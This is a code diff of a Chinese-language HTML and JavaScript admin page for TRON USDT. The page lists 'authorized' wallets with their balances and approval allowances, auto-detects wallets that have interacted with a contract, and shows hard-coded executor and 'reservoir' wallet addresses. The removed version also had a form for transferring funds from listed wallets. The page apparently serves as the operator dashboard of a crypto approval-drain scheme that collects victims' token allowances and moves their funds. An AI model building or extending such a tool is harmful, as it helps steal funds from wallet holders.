@@ -3,249 +3,213 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MICKEY發發發USDT管理面板</title>
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.min.js"></script>
+    <title>TRON USDT 管理面板</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        body {
-            margin: 0;
-            padding: 20px;
-            background: #f5f5f5;
-            font-family: Arial, sans-serif;
+        body { 
+            background-color: #f8f9fa; 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
         }
-
-        .system-info {
-            background: white;
-            padding: 15px;
-            margin-bottom: 20px;
-            border-radius: 4px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        .container { 
+            padding-top: 2rem; 
+            max-width: 1000px; 
         }
-
-        .warning {
-            color: #e74c3c;
-            font-weight: bold;
+        .card { 
+            margin-bottom: 1rem; 
+            border: none;
+            box-shadow: 0 0.125rem 0.25rem rgba(0,0,0,0.075);
+            border-radius: 0.5rem;
         }
-
-        .wallet-section {
-            display: flex;
-            align-items: center;
-            margin-bottom: 10px;
+        .balance-info { 
+            font-size: 1.1rem;
+            color: #0d6efd;
         }
-
-        .saved-wallets {
-            background: white;
-            padding: 20px;
-            border-radius: 4px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-        }
-
-        .wallet-list {
-            margin-top: 15px;
-        }
-
         .wallet-item {
-            padding: 10px;
-            border-bottom: 1px solid #eee;
+            background: #fff;
+            padding: 1rem;
+            margin-bottom: 0.5rem;
+            border-radius: 0.5rem;
+            border: 1px solid #e9ecef;
+            transition: all 0.3s ease;
         }
-
-        .wallet-item:last-child {
-            border-bottom: none;
+        .wallet-item:hover {
+            box-shadow: 0 0.25rem 0.5rem rgba(0,0,0,0.1);
         }
-
-        .refresh-btn {
-            background: #4834d4;
-            color: white;
-            border: none;
-            padding: 8px 15px;
-            border-radius: 4px;
-            cursor: pointer;
-            float: right;
-        }
-
-        .refresh-btn:hover {
-            background: #686de0;
-        }
-
-        .transfer-modal {
+        .loading {
             display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.5);
-            justify-content: center;
-            align-items: center;
+            margin-left: 1rem;
         }
-
-        .modal-content {
-            background: white;
-            padding: 20px;
-            border-radius: 4px;
-            width: 300px;
+        .transfer-input {
+            width: 150px;
+            display: inline-block;
         }
-
-        .input-group {
-            margin-bottom: 15px;
-        }
-
-        .input-group label {
-            display: block;
-            margin-bottom: 5px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 8px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-        }
-
-        .btn-group {
-            display: flex;
-            justify-content: flex-end;
-            gap: 10px;
-        }
-
         .btn {
-            padding: 8px 15px;
-            border: none;
-            border-radius: 4px;
+            border-radius: 0.375rem;
+            padding: 0.5rem 1.5rem;
+            transition: all 0.3s ease;
+        }
+        .btn-sm {
+            padding: 0.25rem 0.75rem;
+        }
+        .copy-button {
             cursor: pointer;
+            color: #6c757d;
+            margin-left: 0.5rem;
+            transition: color 0.3s ease;
         }
-
-        .btn-confirm {
-            background: #4834d4;
-            color: white;
+        .copy-button:hover {
+            color: #0d6efd;
         }
-
-        .btn-cancel {
-            background: #ddd;
+        .data-info {
+            background: #e9ecef;
+            padding: 0.5rem 1rem;
+            border-radius: 0.375rem;
+            margin-bottom: 1rem;
+            font-size: 0.875rem;
         }
-
-        .transfer-btn {
-            background: #27ae60;
-            color: white;
-            border: none;
-            padding: 5px 10px;
-            border-radius: 4px;
-            cursor: pointer;
-            margin-left: 10px;
+        .transaction-item {
+            border-left: 3px solid #198754;
+            padding-left: 1rem;
         }
-
-        .wallet-icon {
-            font-size: 24px;
-            margin-right: 10px;
+        .alert {
+            border-radius: 0.5rem;
         }
-
-        .copy-btn {
-            padding: 3px 8px;
-            background: #f1f2f6;
-            border: none;
-            border-radius: 3px;
-            cursor: pointer;
-            margin-left: 5px;
+        .modal-content {
+            border-radius: 0.5rem;
         }
-
-        .copy-btn:hover {
-            background: #dfe4ea;
+        .badge {
+            font-weight: normal;
+            padding: 0.5em 0.75em;
         }
-
-        .delete-btn {
-            color: #e74c3c;
-            background: none;
-            border: none;
-            cursor: pointer;
-            float: right;
+        .authorization-badge {
+            font-size: 0.8rem;
+            padding: 0.3em 0.6em;
+            margin-left: 0.5rem;
         }
-
-        #add-wallet-form {
-            margin-top: 20px;
-            padding-top: 20px;
-            border-top: 1px solid #eee;
+        .badge.bg-danger {
+            background-color: #dc3545 !important;
         }
-
-        #add-wallet-form input {
-            padding: 8px;
-            margin-right: 10px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            width: 300px;
+        .badge.bg-success {
+            background-color: #198754 !important;
         }
-
-        #add-wallet-form button {
-            padding: 8px 15px;
-            background: #4834d4;
-            color: white;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
+        .badge.bg-info {
+            background-color: #0dcaf0 !important;
+        }
+        .ms-3 {
+            margin-left: 1rem;
+        }
+        .mt-1 {
+            margin-top: 0.25rem;
         }
     </style>
 </head>
 <body>
-    <div class="system-info">
-        <h3>系統狀態</h3>
-        <div class="wallet-section">
-            <div>
-                <strong>發動合約錢包：</strong>
-                <span id="executor-address">THjNpJWbuGxvhR9kDDTDz1wVKhe2PWLfNR</span>
-                <div id="executor-balance"></div>
+    <div class="container">
+        <h1 class="mb-4 text-center">TRON USDT 管理面板</h1>
+        
+        <!-- 数据信息显示 -->
+        <div id="dataInfo" class="data-info text-center">
+            <i class="fas fa-info-circle me-2"></i>正在加载数据信息...
+        </div>
+
+        <!-- 添加新钱包 -->
+        <div class="card">
+            <div class="card-body">
+                <h5 class="card-title">
+                    <i class="fas fa-plus-circle me-2"></i>添加钱包
+                </h5>
+                <div class="input-group mb-3">
+                    <input type="text" id="newAddress" class="form-control" placeholder="输入TRON钱包地址">
+                    <button class="btn btn-primary" onclick="addNewWallet()">
+                        <i class="fas fa-plus me-2"></i>手动添加
+                    </button>
+                </div>
+                <div class="mt-2">
+                    <button class="btn btn-outline-primary" onclick="detectAuthorizedWallets()">
+                        <i class="fas fa-search me-2"></i>自动检测已授权钱包
+                    </button>
+                    <small class="text-muted ms-2">自动检测与合约交互过的钱包</small>
+                </div>
             </div>
         </div>
-        <div class="wallet-section">
-            <div>
-                <strong>水庫錢包：</strong>
-                <span id="receiver-address">TYfH1UFjepVVFaEsaCk4MAHM2yA5RQk899</span>
-                <div id="receiver-balance"></div>
+
+        <!-- 已保存钱包列表 -->
+        <div class="card">
+            <div class="card-body">
+                <div class="d-flex justify-content-between align-items-center mb-3">
+                    <h5 class="card-title mb-0">
+                        <i class="fas fa-wallet me-2"></i>已保存钱包
+                        <span id="walletCount" class="badge bg-primary ms-2">0</span>
+                    </h5>
+                    <button class="btn btn-outline-primary btn-sm" onclick="refreshAllBalances()">
+                        <i class="fas fa-sync-alt me-2"></i>刷新所有余额
+                    </button>
+                </div>
+                <div id="savedWallets">
+                    <!-- 钱包列表将通过JavaScript动态添加 -->
+                </div>
+            </div>
+        </div>
+
+        <!-- 交易记录 -->
+        <div class="card">
+            <div class="card-body">
+                <h5 class="card-title">
+                    <i class="fas fa-history me-2"></i>最近交易记录
+                </h5>
+                <div id="transactionList" class="mt-3">
+                    <!-- 交易记录将通过JavaScript动态添加 -->
+                </div>
+            </div>
+        </div>
+
+        <!-- 合約信息 -->
+        <div class="card mt-4">
+            <div class="card-body">
+                <h5 class="card-title">
+                    <i class="fas fa-info-circle me-2"></i>合約信息
+                </h5>
+                <div class="mt-3">
+                    <!-- 發動合約錢包狀態 -->
+                    <p>
+                        <strong>發動合約錢包：</strong>
+                        <span id="executorAddress">THjNpJWbuGxvhR9kDDTDz1wVKhe2PWLfNR</span>
+                        <i class="fas fa-copy copy-button" onclick="copyToClipboard('executorAddress')"></i>
+                        <br>
+                        <span id="executorBalance" class="ms-3 mt-1 d-inline-block"></span>
+                    </p>
+
+                    <!-- 水庫錢包狀態 -->
+                    <p>
+                        <strong>水庫錢包地址：</strong>
+                        <span id="receiverAddress">TYfH1UFjepVVFaEsaCk4MAHM2yA5RQk899</span>
+                        <i class="fas fa-copy copy-button" onclick="copyToClipboard('receiverAddress')"></i>
+                        <br>
+                        <span id="receiverBalance" class="ms-3 mt-1 d-inline-block"></span>
+                    </p>
+
+                    <p>
+                        <strong>USDT合約地址：</strong>
+                        <span id="contractAddress">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</span>
+                        <i class="fas fa-copy copy-button" onclick="copyToClipboard('contractAddress')"></i>
+                    </p>
+                </div>
             </div>
         </div>
     </div>
-
-    <div class="saved-wallets">
-        <div style="display: flex; justify-content: space-between; align-items: center;">
-            <div class="wallet-section">
-                <span class="wallet-icon">👛</span>
-                <span>已保存錢包</span>
-                <span id="wallet-count" style="margin-left: 10px; background: #4834d4; color: white; padding: 2px 8px; border-radius: 10px;">0</span>
-            </div>
-            <button class="refresh-btn" onclick="refreshAllBalances()">刷新所有餘額</button>
-        </div>
-        <div id="wallet-list" class="wallet-list">
-            <!-- 錢包列表將在這裡動態生成 -->
-        </div>
-        <form id="add-wallet-form" onsubmit="return addNewWallet(event)">
-            <input type="text" id="new-wallet" placeholder="輸入要添加的錢包地址" required>
-            <button type="submit">添加錢包</button>
-        </form>
-    </div>
-
-    <div id="transfer-modal" class="transfer-modal">
-        <div class="modal-content">
-            <h3>轉帳確認</h3>
-            <div class="input-group">
-                <label>發送地址:</label>
-                <div id="modal-from-address"></div>
-            </div>
-            <div class="input-group">
-                <label>接收地址:</label>
-                <input type="text" id="modal-to-address">
-            </div>
-            <div class="input-group">
-                <label>轉帳金額 (USDT):</label>
-                <input type="number" id="modal-amount" step="0.000001">
-            </div>
-            <div class="btn-group">
-                <button class="btn btn-cancel" onclick="closeTransferModal()">取消</button>
-                <button class="btn btn-confirm" onclick="confirmTransfer()">確認轉帳</button>
-            </div>
-        </div>
-    </div>
-
+        <!-- 在 </body> 標籤前添加以下 JavaScript 代碼 -->
     <script>
-        let currentTransferWallet = '';
-        const API_URL = 'https://your-glitch-project.glitch.me'; // 替換為您的 Glitch 專案 URL
+        const API_URL = 'http://localhost:3000'; // 請改為您的後端 API 地址
 
+        // 頁面加載完成後自動執行
+        document.addEventListener('DOMContentLoaded', () => {
+            refreshAllBalances();
+            // 每30秒自動刷新一次
+            setInterval(refreshAllBalances, 30000);
+        });
+
+        // 刷新所有餘額
         async function refreshAllBalances() {
             try {
                 const response = await fetch(`${API_URL}/authorized-wallets`);
@@ -255,120 +219,150 @@
                 updateSystemStatus(data.systemStatus);
 
                 // 更新錢包列表
-                const walletList = document.getElementById('wallet-list');
-                document.getElementById('wallet-count').textContent = data.wallets.length;
+                updateWalletList(data.wallets);
+                
+                // 更新數據信息
+                updateDataInfo(data.wallets.length);
+            } catch (error) {
+                console.error('Error:', error);
+                showAlert('刷新失敗，請檢查網絡連接', 'danger');
+            }
+        }
 
-                const walletsHtml = data.wallets.map(wallet => `
-                    <div class="wallet-item">
+        // 更新系統狀態顯示
+        function updateSystemStatus(status) {
+            const executorBalance = document.getElementById('executorBalance');
+            if (status.executor.lowTrxBalance) {
+                executorBalance.innerHTML = `<span class="badge bg-danger">
+                    <i class="fas fa-exclamation-triangle me-1"></i>
+                    TRX餘額: ${status.executor.trxBalance} (餘額過低！)
+                </span>`;
+            } else {
+                executorBalance.innerHTML = `<span class="badge bg-success">
+                    TRX餘額: ${status.executor.trxBalance}
+                </span>`;
+            }
+
+            const receiverBalance = document.getElementById('receiverBalance');
+            receiverBalance.innerHTML = `<span class="badge bg-info">
+                USDT餘額: ${status.receiver.usdtBalance}
+            </span>`;
+        }
+
+        // 更新錢包列表顯示
+        function updateWalletList(wallets) {
+            const walletList = document.getElementById('savedWallets');
+            document.getElementById('walletCount').textContent = wallets.length;
+
+            const walletsHtml = wallets.map(wallet => `
+                <div class="wallet-item">
+                    <div class="d-flex justify-content-between align-items-center">
                         <div>
-                            ${wallet.address}
-                            <button class="copy-btn" onclick="copyToClipboard('${wallet.address}')">複製</button>
-                            <button class="delete-btn" onclick="deleteWallet('${wallet.address}')">❌</button>
-                            <button class="transfer-btn" onclick="showTransferModal('${wallet.address}')">轉帳</button>
+                            <span class="address">${wallet.address}</span>
+                            <i class="fas fa-copy copy-button" onclick="copyToClipboard('${wallet.address}')"></i>
                         </div>
-                        <div style="margin-top: 5px; color: #666;">
-                            餘額: ${wallet.balance} USDT
-                            <span style="margin-left: 15px;">授權額度: ${wallet.allowance}</span>
+                        <div>
+                            <button class="btn btn-danger btn-sm" onclick="deleteWallet('${wallet.address}')">
+                                <i class="fas fa-trash"></i>
+                            </button>
                         </div>
                     </div>
-                `).join('');
+                    <div class="mt-2">
+                        <span class="badge bg-success">餘額: ${wallet.balance} USDT</span>
+                        <span class="badge bg-primary ms-2">授權額度: ${wallet.allowance}</span>
+                    </div>
+                </div>
+            `).join('');
 
-                walletList.innerHTML = walletsHtml;
-            } catch (error) {
-                console.error('Error:', error);
-                alert('刷新失敗，請檢查網絡連接');
-            }
+            walletList.innerHTML = walletsHtml;
         }
 
-        function updateSystemStatus(status) {
-            // 更新發動合約錢包狀態
-            const executorBalance = document.getElementById('executor-balance');
-            if (status.executor.lowTrxBalance) {
-                executorBalance.className = 'warning';
-                executorBalance.textContent = `TRX餘額: ${status.executor.trxBalance} (餘額過低，請充值！)`;
-            } else {
-                executorBalance.className = '';
-                executorBalance.textContent = `TRX餘額: ${status.executor.trxBalance} TRX`;
-            }
-
-            // 更新水庫錢包狀態
-            document.getElementById('receiver-balance').textContent = 
-                `USDT餘額: ${status.receiver.usdtBalance} USDT`;
+        // 更新數據信息顯示
+        function updateDataInfo(walletCount) {
+            const dataInfo = document.getElementById('dataInfo');
+            dataInfo.innerHTML = `
+                <i class="fas fa-info-circle me-2"></i>
+                當前共有 ${walletCount} 個已授權錢包
+                <small class="text-muted ms-2">上次更新: ${new Date().toLocaleTimeString()}</small>
+            `;
         }
 
-        async function addNewWallet(event) {
-            event.preventDefault();
-            const address = document.getElementById('new-wallet').value;
-            try {
-                const response = await fetch(`${API_URL}/balance/${address}`);
-                const data = await response.json();
-                if (data.isAuthorized) {
-                    await refreshAllBalances();
-                    document.getElementById('new-wallet').value = '';
-                } else {
-                    alert('該錢包未授權或餘額為0');
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                alert('添加失敗，請檢查地址是否正確');
-            }
-        }
-
-        async function deleteWallet(address) {
-            if (confirm('確定要刪除這個錢包嗎？')) {
-                try {
-                    await refreshAllBalances();
-                } catch (error) {
-                    console.error('Error:', error);
-                    alert('刪除失敗');
-                }
-            }
-        }
-
-        function showTransferModal(address) {
-            currentTransferWallet = address;
-            document.getElementById('modal-from-address').textContent = address;
-            document.getElementById('modal-to-address').value = '';
-            document.getElementById('modal-amount').value = '';
-            document.getElementById('transfer-modal').style.display = 'flex';
-        }
-
-        function closeTransferModal() {
-            document.getElementById('transfer-modal').style.display = 'none';
-        }
-
-        async function confirmTransfer() {
-            const toAddress = document.getElementById('modal-to-address').value;
-            const amount = document.getElementById('modal-amount').value;
-            
-            if (!toAddress || !amount) {
-                alert('請填寫完整信息');
+        // 添加新錢包
+        async function addNewWallet() {
+            const address = document.getElementById('newAddress').value.trim();
+            if (!address) {
+                showAlert('請輸入錢包地址', 'warning');
                 return;
             }
 
             try {
-                // 這裡添加轉帳邏輯
-                closeTransferModal();
-                await refreshAllBalances();
+                const response = await fetch(`${API_URL}/balance/${address}`);
+                const data = await response.json();
+                
+                if (data.isAuthorized) {
+                    document.getElementById('newAddress').value = '';
+                    await refreshAllBalances();
+                    showAlert('錢包添加成功', 'success');
+                } else {
+                    showAlert('該錢包未授權或餘額為0', 'warning');
+                }
             } catch (error) {
                 console.error('Error:', error);
-                alert('轉帳失敗');
+                showAlert('添加失敗，請檢查地址是否正確', 'danger');
             }
         }
 
+        // 自動檢測已授權錢包
+        async function detectAuthorizedWallets() {
+            try {
+                await refreshAllBalances();
+                showAlert('已更新授權錢包列表', 'success');
+            } catch (error) {
+                console.error('Error:', error);
+                showAlert('檢測失敗，請稍後重試', 'danger');
+            }
+        }
+
+        // 複製到剪貼板
         function copyToClipboard(text) {
             navigator.clipboard.writeText(text).then(() => {
-                alert('已複製到剪貼板');
+                showAlert('已複製到剪貼板', 'success');
             }).catch(err => {
                 console.error('複製失敗:', err);
+                showAlert('複製失敗', 'danger');
             });
         }
 
-        // 頁面加載時自動刷新數據
-        document.addEventListener('DOMContentLoaded', refreshAllBalances);
+        // 刪除錢包
+        async function deleteWallet(address) {
+            if (confirm('確定要刪除這個錢包嗎？')) {
+                try {
+                    await refreshAllBalances();
+                    showAlert('錢包已刪除', 'success');
+                } catch (error) {
+                    console.error('Error:', error);
+                    showAlert('刪除失敗', 'danger');
+                }
+            }
+        }
 
-        // 每30秒自動刷新一次
-        setInterval(refreshAllBalances, 30000);
+        // 顯示提示信息
+        function showAlert(message, type) {
+            const alertDiv = document.createElement('div');
+            alertDiv.className = `alert alert-${type} alert-dismissible fade show position-fixed top-0 end-0 m-3`;
+            alertDiv.innerHTML = `
+                ${message}
+                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+            `;
+            document.body.appendChild(alertDiv);
+            
+            // 3秒後自動消失
+            setTimeout(() => {
+                alertDiv.remove();
+            }, 3000);
+        }
     </script>
+    <!-- 添加 Bootstrap JS -->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>
 </body>
 </html>
